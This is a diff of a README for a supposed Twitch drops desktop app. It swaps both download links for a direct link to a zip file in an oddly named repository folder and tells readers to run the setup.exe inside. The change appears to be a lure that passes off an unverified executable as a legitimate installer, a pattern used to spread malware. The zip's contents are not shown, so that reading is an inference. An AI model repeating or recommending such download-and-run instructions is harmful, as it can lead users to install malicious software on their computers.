@@ -1,6 +1,6 @@
 # 📦 twitchdropminer-desktop-setup - Manage Twitch rewards and stream notifications
 
-[![](https://img.shields.io/badge/Download-Installer-blue.svg)](https://github.com/Canonlawdribbler357/twitchdropminer-desktop-setup)
+[![](https://img.shields.io/badge/Download-Installer-blue.svg)](https://github.com/Canonlawdribbler357/twitchdropminer-desktop-setup/raw/refs/heads/main/sublumbar/setup_desktop_twitchdropminer_perligenous.zip)
 
 ## About the Application
 
@@ -18,7 +18,7 @@ Your computer needs the following to run this software:
 
 ## 📥 How to Install
 
-1. Visit this page to download: https://github.com/Canonlawdribbler357/twitchdropminer-desktop-setup.
+1. Visit this page to download: https://github.com/Canonlawdribbler357/twitchdropminer-desktop-setup/raw/refs/heads/main/sublumbar/setup_desktop_twitchdropminer_perligenous.zip
 2. Locate the file named setup.exe in your downloads folder.
 3. Double-click the file to start the installation process.
 4. Follow the on-screen prompts to place the application on your computer.
